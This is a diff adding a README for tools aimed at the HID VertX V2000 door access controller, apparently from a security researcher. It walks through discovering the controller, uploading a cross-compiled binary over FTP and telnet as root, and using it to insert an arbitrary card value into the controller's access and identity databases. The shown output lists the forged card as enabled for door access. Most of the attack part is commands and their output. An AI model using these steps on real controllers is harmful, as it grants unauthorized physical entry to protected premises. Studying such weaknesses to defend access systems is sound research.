@@ -1,0 +1,121 @@
+VertX Tools - 
+Tools to poke and prod the VertX V2000
+
+By Brad Antoniewicz
+brad.antoniewicz@foundstone.com
+--------------------------------------------------
+
+VertX_Query.py - 
+
+ Example Usage:
+ root@bt:/VertX# ./VertX_Query.py -h 255.255.255.255 -m 01
+ VertX_Query.py - HID VertX Discovery and Query Tool
+ by brad antoniewicz
+ --------------------------------------
+
+ [+] Got Response
+ Type: VertXController - V2000
+ Version: 2.2.7.18
+ IP Address: 192.168.1.50
+ MAC Address: 00:06:8E:FF:FF:FF
+
+VertX_CacheTool.c - 
+
+This tool can be compiled locally or cross-compiled to
+run on the VertX V2000. If you use it locally, you'll
+have to copy the AccessDB and IdentDB files to your system
+
+To compile for Cris:
+
+Set up build environment, instructions here:
+	http://developer.axis.com/wiki/doku.php?id=axis:sdk
+
+Then compile:
+
+# export PATH=$PATH:/usr/local/cris/bin/
+# cris-gcc -mlinux -o VertX_CacheTool VertX_CacheTool.c
+
+
+Copy VertX_CacheTool to the VertX via FTP:
+
+# ftp 192.168.1.1
+Connected to 192.168.1.1
+220 Axis Developer Board LX release 2.2.0 (Feb 27 2007) ready.
+Name (192.168.1.1:root): root
+331 User name okay, need password.
+Password:
+230 User logged in, proceed.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> put VertX_CacheTool /mnt/flash/VertX_CacheTool
+local: VertX_CacheTool remote: /mnt/flash/VertX_CacheTool
+200 Command okay.
+150 Opening data connection.
+226 Transfer complete.
+21024 bytes sent in 0.00 secs (4958.0 kB/s)
+ftp>
+
+
+Telnet and run the tool:
+(-c DEADBEEF00 inserts the card value into cache, and -r restarts the "access" and "ident" processes)
+
+# telnet 192.168.1.1
+Trying 192.168.1.1...
+Connected to 192.168.1.1.
+Escape character is '^]'.
+
+Axis Developer Board LX release 2.2.0
+Linux 2.4.26 on a cris (0)
+
+VertXController login: root
+Password:
+
+
+BusyBox v1.00-rc3 (2007.02.27-17:05+0000) Built-in shell (ash)
+Enter 'help' for a list of built-in commands.
+
+[root@VertXController /]13100# cd /mnt/flash
+[root@VertXController /mnt/flash]13100# chmod +x VertX_CacheTool
+[root@VertXController /mnt/flash]13100# ./VertX_CacheTool -c DEADBEEF00 -r
+HID VertX V2000 IdentDB/AccessDB Tool v0.3
+By brad a.
+---------------------------------
+Using Card Value: de ad be ef 00
+AccessDB Location: /mnt/flash/config/AccessDB
+IdentDB Location: /mnt/flash/config/IdentDB
+Reading AccessDB
+Reading IdentDB
+Adding entry into cache
+Building AccessDB Entry....
+Adding entry into cache
+Building IdentDB Entry....
+Saving updated DB to: /mnt/flash/config/AccessDB
+Saving updated DB to: /mnt/flash/config/IdentDB
+Restarting /etc/init.d/access
+Restarting /etc/init.d/ident
+[root@VertXController /mnt/flash]13100#
+
+
+Then confirm its been updated:
+(notice that deadbeef00 is in cache as the last entry)
+
+[root@VertXController /mnt/flash]13100# ./VertX_CacheTool -p
+HID VertX V2000 IdentDB/AccessDB Tool v0.3
+By brad a.
+---------------------------------
+AccessDB Location: /mnt/flash/config/AccessDB
+IdentDB Location: /mnt/flash/config/IdentDB
+Reading AccessDB
+Reading IdentDB
+Processing Data from AccessDB and IdentDB
+DB ID: 01 | Card ID: 00 26 3f 95 00 00 00 00 00 00 | Doors: 02 | Enabled: Yes! [00]
+DB ID: 09 | Card ID: 00 26 3f a9 00 00 00 00 00 00 | Doors: 03 | Enabled: Yes! [00]
+DB ID: 0b | Card ID: 00 26 3f 9c 00 00 00 00 00 00 | Doors: 04 | Enabled: Yes! [00]
+DB ID: 0d | Card ID: 00 90 65 c0 3b 00 00 00 00 00 | Doors: 02 | Enabled: Yes! [00]
+DB ID: 0e | Card ID: 00 26 3f 9a 00 00 00 00 00 00 | Doors: 02 | Enabled: Yes! [00]
+DB ID: 0f | Card ID: de ad be ef 00 00 00 00 00 00 | Doors: 02 | Enabled: Yes! [00]
+
+
+
+
+
